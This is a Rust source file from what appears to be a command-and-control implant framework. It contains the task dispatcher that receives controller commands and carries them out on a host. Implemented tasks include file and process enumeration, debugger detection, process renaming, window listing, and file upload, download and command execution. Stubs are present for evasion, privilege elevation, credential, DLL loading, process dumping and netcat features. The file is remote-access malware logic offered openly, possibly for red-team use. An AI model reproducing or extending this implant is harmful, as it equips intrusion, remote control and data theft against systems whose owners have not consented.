// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]

use core::{cmp, matches};

use crate::c2::event::{Broadcaster, Context, Entry, Queue, Return, Task, ThreadQueue};
use crate::c2::task::{task_download, task_proc, task_ui, task_upload, task_window_list, Fd, OsMetadata, TID};
use crate::c2::{BufferError, BufferResult, CoreError, CoreResult, FileEntry};
use crate::com::Packet;
use crate::data::time::Time;
use crate::data::{write_fiber_vec, Writable, Writer};
use crate::device::{self, expand, home_dir, is_debugged, set_process_name, whoami, Shell, ID};
use crate::env::{current_dir, current_exe, set_current_dir};
use crate::fs::{metadata, read_dir};
use crate::io::ErrorKind;
use crate::prelude::*;
use crate::process::list_processes;
use crate::sync::mpsc::{sync_channel, Receiver, SyncSender, TryRecvError, TrySendError};
use crate::thread::Thread;
use crate::util::log::{MaybeLog, RefLog, ThreadLog};
use crate::{debug, error, ignore_error, info, io, ok_or_break, trace};

pub struct Mux {
    pub log:   RefLog,
    pub shell: Shell,

    id:      ID,
    #[allow(dead_code)] // used for mscripts, not implemented yet.
    int: SyncSender<Packet>,
    send:    SyncSender<Packet>,
    tasks:   Receiver<Packet>,
    queue:   Queue,
    threads: ThreadQueue,
}

pub type Tasker = fn(&Context, u8, &mut Packet, &mut Packet) -> io::Result<Return>;

impl Mux {
    #[inline]
    pub(super) fn new(i: ID, l: &ThreadLog, x: SyncSender<Packet>, q: &SyncSender<Packet>) -> CoreResult<(Mux, Broadcaster<Packet>)> {
        let (s, r) = sync_channel(256);
        let m = Mux {
            id:      i,
            int:     x,
            log:     l.new_ref(),
            tasks:   r,
            send:    q.clone(),
            shell:   Shell::new(),
            queue:   Queue::new()?,
            threads: ThreadQueue::new(),
        };
        let x = Broadcaster::new(m.queue.beacon(), s);
        Ok((m, x))
    }

    #[inline]
    pub fn thread(&self, index: u8) -> Option<&Thread> {
        self.threads.thread(index)
    }
    pub fn submit(&mut self, fd: Option<Fd>, mut t: Task) {
        let mut e = Entry::new(t.job, fd, &mut t, self.id);
        match t.duration() {
            None if !e.fd() => {
                bugtrack!(
                    "c2::Mux.submit(): Adding new Task {} to Thread queue..",
                    t.job
                );
                return self.threads.send(t, &self.send);
            },
            Some(v) if !e.fd() => {
                bugtrack!(
                    "c2::Mux.submit(): Adding new Task {} with timeout {v:?} to Thread queue..",
                    t.job
                );
                e.timeout(v);
                self.threads.send(t, &self.send);
            },
            _ => e.task(t),
        }
        bugtrack!(
            "c2::Mux.submit(): Adding new Task {} to Event queue..",
            e.job
        );
        self.queue.add(e);
    }
    pub fn thread_loop(&mut self, tasker: Option<&'static Tasker>) {
        loop {
            debug!(self.log, "[{}/Mux] Waiting for Task..", self.id);
            let n = ok_or_break!(self.run());
            debug!(self.log, "[{}/Mux] Received Packet {n}!", self.id);
            let j = n.job;
            let v = match self.process_async(n, tasker) {
                Err(e) => {
                    let mut x = Packet::new_with(TID::RV_RESULT, j, self.id);
                    match e.unpack() {
                        // Full is returned by 'process_async' if no match is found, this
                        // way the orig Packet is returned.
                        Ok(v) => match self.process(v, &mut x) {
                            Err(e) => Err((e, x)),
                            Ok(()) => Ok(x),
                        },
                        // Err and Ok both return 'n'
                        Err(e) => Err((e, x)),
                    }
                },
                Ok(v) => Ok(some_or_continue!(v)),
            };
            // Flatten and fix.
            let mut x = match v {
                Err((e, mut i)) => {
                    error!(
                        self.log,
                        "[{}/Mux] Failed to process request '{e}', returning {i}!", self.id
                    );
                    e.write(&mut i);
                    i
                },
                Ok(i) => {
                    trace!(
                        self.log,
                        "[{}/Mux] Processing completed, result {i}!",
                        self.id
                    );
                    i
                },
            };
            (x.id, x.job) = (TID::RV_RESULT, j);
            // Normalize
            if self.send.send(x).is_err() {
                info!(
                    self.log,
                    "[{}/Mux] Packet channel send failed, main thread closed, quiting!", self.id
                );
                break;
            }
        }
    }

    fn run(&mut self) -> Result<Packet, ()> {
        loop {
            bugtrack!("c2::Mux.run(): Starting poll..");
            if let Some(v) = self.queue.run() {
                let r = match v {
                    Some(p) => p,
                    None => continue,
                };
                if self
                    .send
                    .try_send(r)
                    .map_err(|e| matches!(e, TrySendError::Disconnected(_)))
                    .is_err_and(|v| v)
                {
                    bugtrack!("c2::Mux.run(): Send to output Queue failed as it's disconnected!");
                    return Err(());
                }
                continue;
            }
            bugtrack!("c2::Mux.run(): Woken for a receive event..");
            match self.tasks.try_recv() {
                Err(TryRecvError::Disconnected) => {
                    bugtrack!("c2::Mux.run(): Receive queue failed as it's disconnected!");
                    return Err(());
                },
                Ok(v) => return Ok(v),
                _ => self.queue.reset_wake(),
            }
        }
    }
    fn process(&mut self, mut r: Packet, w: &mut Packet) -> CoreResult<()> {
        debug!(self.log, "[{}/Mux] TaskID is 0x{:X}.", self.id, r.id);
        match r.id {
            TID::MV_PWD => {
                ignore_error!(w.write_str(current_dir()?.to_string_lossy()));
            },
            TID::MV_CWD => match r.read_str_ptr()? {
                Some(v) => set_current_dir(expand(v))?,
                None => set_current_dir(expand(
                    &home_dir().unwrap_or_default().to_str().unwrap_or_default(),
                ))?,
            },
            TID::MV_LIST => {
                let d = r.read_str_ptr()?.map_or_else(
                    || current_dir().map_or_else(|_| ".".to_string(), |v| v.to_string_lossy().to_string()),
                    |v| expand(v),
                );
                let m = metadata(&d)?;
                if !m.is_dir() {
                    ignore_error!(w.write_u8(1));
                    ignore_error!(w.write_string(&d));
                    ignore_error!(w.write_u32(m.get_mode()));
                    ignore_error!(w.write_u64(m.len()));
                    ignore_error!(w.write_i64(m.modified().map_or_else(|_| 0, |v| Time::from(v).unix())));
                    return Ok(());
                }
                let mut e = Vec::new();
                for i in read_dir(d)? {
                    e.push(FileEntry::new(ok_or_continue!(i)));
                }
                e.sort();
                ignore_error!(w.write_u32(e.len() as u32));
                for i in 0..cmp::min(e.len(), 0xFFFFFFFF) {
                    ignore_error!(w.write_str(e[i].dir.file_name().to_string_lossy()));
                    match &e[i].meta {
                        Some(v) => {
                            ignore_error!(w.write_u32(v.get_mode()));
                            ignore_error!(w.write_u64(v.len()));
                            ignore_error!(w.write_i64(m.modified().map_or_else(|_| 0, |v| Time::from(v).unix())));
                        },
                        None => {
                            ignore_error!(w.write_u32(0));
                            ignore_error!(w.write_u64(0));
                            ignore_error!(w.write_u64(0));
                        },
                    }
                }
            },
            TID::MV_MOUNTS => {
                ignore_error!(write_fiber_vec(w, &device::mounts()?));
            },
            TID::MV_WHOAMI => {
                ignore_error!(w.write_str(whoami()?));
                ignore_error!(w.write_str(current_exe()?.to_string_lossy()));
            },
            TID::MV_PS => {
                let e = list_processes()?;
                let n = cmp::min(e.len(), 0xFFFFFFFF);
                ignore_error!(w.write_u32(n as u32));
                for i in 0..n {
                    e[i].write_stream(w)?;
                }
            },
            TID::MV_DEBUG_CHECK => {
                ignore_error!(w.write_bool(is_debugged()));
            },
            TID::TV_CHECK => (),
            TID::TV_PATCH => (),
            TID::TV_RENAME => {
                set_process_name(
                    r.read_str_ptr()?
                        .ok_or_else(|| CoreError::from(ErrorKind::InvalidFilename))?,
                )?;
            },
            TID::TV_REV_TO_SELF => todo!(),
            TID::TV_REGISTRY => (),
            TID::TV_EVADE => (),
            TID::TV_UI => task_ui(self, r)?,
            TID::TV_WINDOW_LIST => {
                let e = task_window_list()?;
                let n = cmp::min(e.len(), 0xFFFFFFFF);
                ignore_error!(w.write_u32(n as u32));
                for i in 0..n {
                    e[i].write_stream(w)?;
                }
            },
            TID::TV_ELEVATE => (),
            TID::TV_UNTRUST => (),
            TID::TV_POWER => (),
            TID::TV_LOGINS => (),
            TID::TV_LOGINS_ACTION => (),
            TID::TV_LOGINS_PROC => (),
            TID::TV_FUNCMAP => (),
            TID::TV_FUNCMAP_LIST => (),
            _ => return Err(CoreError::InvalidTask),
        }
        Ok(())
    }
    fn process_async(&mut self, r: Packet, tasker: Option<&'static Tasker>) -> BufferResult<Option<Packet>> {
        match r.id {
            TID::TV_UPLOAD => task_upload(self, r),
            TID::TV_DOWNLOAD => task_download(self, r),
            TID::TV_EXECUTE => task_proc(self, r),
            TID::TV_ASSEMBLY => Ok(None),
            TID::TV_PULL => Ok(None),
            TID::TV_PULL_EXECUTE => Ok(None),
            TID::TV_ZOMBIE => Ok(None),
            TID::TV_DLL => Ok(None),
            TID::TV_SCREEN_SHOT => Ok(None),
            TID::TV_DUMP_PROC => Ok(None),
            TID::TV_IO => Ok(None),
            TID::TV_TROLL => Ok(None),
            TID::TV_LOGIN => Ok(None),
            TID::TV_NETCAT => Ok(None),
            _ => match tasker {
                Some(f) => {
                    debug!(
                        self.log,
                        "[{}/Mux] Passing unknown Task to Tasker..", self.id
                    );
                    self.submit(
                        None,
                        Task::new(r.job, |ctx, w| {
                            let mut v = r;
                            Ok(f(ctx, v.id, &mut v, w)?)
                        }),
                    );
                    Ok(None)
                },
                None => return Err(BufferError::Full(r)),
            },
        }
        .map_err(BufferError::from)
    }
}
